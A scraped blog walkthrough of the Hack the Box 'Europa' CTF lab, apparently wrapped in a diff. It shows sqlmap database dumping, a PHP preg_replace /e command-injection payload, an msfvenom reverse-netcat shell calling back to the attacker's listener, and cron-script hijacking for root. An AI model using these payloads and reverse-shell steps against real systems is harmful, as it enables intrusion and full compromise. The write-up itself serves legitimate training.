@@ -1,0 +1,344 @@
+
+								
+																		Hack the Box Challenge: Europa Walkthrough
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on April 9, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends!! Today we are going to solve another CTF challenge “Europa” which is retired vulnerable lab presented by Hack the Box for making online penetration practices according to your experience level. Solving challenges in this lab is not that much tough until you don’t have the correct knowledge of Penetration testing. Let start and learn how to breach a network then exploit it for retrieving desired information.
+Level: Hard
+Task: find user.txt and root.txt file on the victim’s machine.
+Since these labs are online available therefore they have static IP and IP of sense is 10.10.10.22 so let’s begin with nmap port enumeration.
+
+		
+		
+			
+			
+			
+			
+nmap -A 10.10.10.22
+			
+				
+					
+				
+					1
+				
+						nmap -A 10.10.10.22
+					
+				
+			
+		
+
+From given below image, you can observe we found port 22, 80 and  443 are open in victim’s network.
+
+As you have seen in our all previous lab that we love to explore target IP via port 80 on our web browser, similarly we follow that tradition in this also but Bad Unluckily!! This time it didn’t work at all.
+
+Now the last option was to add target IP inside /etc/host file since port 443 was open containing two domain names and as it is a challenge of hack the box thus I edit europacorp.htb and admin-portal.europccorp.htb as a hostname.
+
+Then I explore the domain name: admin-portal.europccorp.htb through the web browser and found following login page as shown below.
+
+In order to breach confidentiality we can try SQL form based attack and for this, I preferred sqlmap following command to enumerate database name.
+
+		
+		
+			
+			
+			
+			
+sqlmap -u https://admin-portal.europacorp.htb --form --dbs --batch
+			
+				
+					
+				
+					1
+				
+						sqlmap -u https://admin-portal.europacorp.htb --form --dbs --batch
+					
+				
+			
+		
+
+
+Luckily our assumption set true and it dumbs the database name “admin”.
+
+Then I run following command for enumerating entire table details.
+
+		
+		
+			
+			
+			
+			
+sqlmap -u https://admin-portal.europacorp.htb -D admin --dump-all --batch
+			
+				
+					
+				
+					1
+				
+						sqlmap -u https://admin-portal.europacorp.htb -D admin --dump-all --batch
+					
+				
+			
+		
+
+
+Awesome!! I found a table “users” which 2 entries having the username and password columns.
+
+Using online MD5 decryption I cracked hash password and received “SupersecretPassword!” and use these credential to login into admin console.
+
+After fruitfully validation I got a dashboard from where I step towards Tools options.
+
+It was set up with a script for open VPN generator using the PHP function preg_replace() on user input. When I investigate more related to this function, it is suggested not to use preg_replace() on user input as it can lead to command execution vulnerability.
+Considering the above suggestion true, I fetched its request into burp suite and sent it to the repeater for exploit command injection vulnerability.
+
+Here I notice three parameter pattern, ipaddress, and test where we can add our arbitrary code for execution but before that, you need to know correct step “how to exploit it” manually.
+
+So when I search more related to this then I found so many links which were describing /e option is a threat to PHP preg_replace function.
+
+Now the code can be execute by sending http post request as given below format.
+pattern=/ip_address/e&amp;ipaddress=arbitrary command&amp;text=ip_addres
+For example:  To check directory list we can run following command and verify resultant output.
+pattern=/ip_address/e&amp;ipaddress=ls &amp;text=ip_addres
+Similarly we can run any malicious code inside this for achieving reversion connection.
+
+Using msfvenom following command we had generated malicious bash code for getting a reverse connection from victim’s machine at our listening port.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.6 lport=1234 R
+			
+				
+					
+				
+					1
+				
+						msfvenom -p cmd/unix/reverse_netcat lhost=10.10.14.6 lport=1234 R
+					
+				
+			
+		
+
+As shown in the below image, the size of the generated payload is 101 bytes, now copy this malicious code and send it to target. After that start Netcat/multi handler for accessing reverse connection and wait for getting its TTY shell.
+
+Now if you will run above-copied code then it will get failed in its mission therefore before running the ordinal code you need to encode it in URL encoding format and then copy the URL encoded code for execution.
+
+Now I had pasted the above-encoded code as shown in below image and execute it with the GO tab.
+
+Meanwhile, I return to my Metasploit terminal and wait for the meterpreter session by exploiting multi handler.
+
+		
+		
+			
+			
+			
+			
+msf use exploit/multi/handler
+msf exploit(multi/handler) set payload cmd/unix/reverse_netcat
+msf exploit(multi/handler) set lhost 10.10.14.6
+msf exploit(multi/handler) set lport 1234
+msf exploit(multi/handler) exploit
+			
+				
+					
+				
+					12345
+				
+						msf use exploit/multi/handlermsf exploit(multi/handler) set payload cmd/unix/reverse_netcatmsf exploit(multi/handler) set lhost 10.10.14.6msf exploit(multi/handler) set lport 1234msf exploit(multi/handler) exploit
+					
+				
+			
+		
+
+From given below image you can observe command session1 opened for accessing victim tty shell then I upgrade command shell into a meterpreter session.
+
+Pleasing!! We have bound the shell of victims system, now let’s finish the task by grabbing user.txt and root.txt file and after traversing some directory I found the user.txt file in /home/john
+
+		
+		
+			
+			
+			
+			
+Meterpreter&gt;sysinfo
+Meterpreter&gt;cd /home
+Meterpreter&gt;cd john
+Meterpreter&gt;cat user.txt
+			
+				
+					
+				
+					1234
+				
+						Meterpreter&gt;sysinfoMeterpreter&gt;cd /homeMeterpreter&gt;cd johnMeterpreter&gt;cat user.txt
+					
+				
+			
+		
+
+Great!!  Here we had completed 1st task now move to 2nd tasK
+
+We start penetrating targets machine and after some time we came to know about the clearlogs file which has root privilege from inside contents of crontab file.
+Using cat command we read contents of clearlogs here the cronjob was executing the shell script logcleared.sh with root permission.
+
+		
+		
+			
+			
+			
+			
+meterpreter&gt;cat /etc/crontab
+meterpreter&gt;cat /var/www/cronjobs/clearlogs
+			
+				
+					
+				
+					12
+				
+						meterpreter&gt;cat /etc/crontabmeterpreter&gt;cat /var/www/cronjobs/clearlogs
+					
+				
+			
+		
+
+
+Then we move into cmd directory and for spawning proper tty shell of target’s system we need to import python3 file, therefore, I run following command inside the meterpreter shell
+
+This time again we had used the same payload cmd/unix/reverse_netcat generated malicious as above on a new port 5678 for reverse connection and copied the generated code and start netcat on a new terminal for getting the reverse connection.
+
+Then edit the above malicious code into logcleared.sh file with help of echo command and gave full permission as shown below.
+
+
+		
+		
+			
+			
+			
+			
+nc -lvp 5678
+			
+				
+					
+				
+					1
+				
+						nc -lvp 5678
+					
+				
+			
+		
+
+WOW, we got the reverse connection from victims system with root access now let’s catch the flag and finished the task.
+
+		
+		
+			
+			
+			
+			
+id
+cd /root
+cat flag.txt
+			
+				
+					
+				
+					123
+				
+						idcd /rootcat flag.txt
+					
+				
+			
+		
+
+Finally, we have completed both tasks successfully and get juice experience.
+
+Author: AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
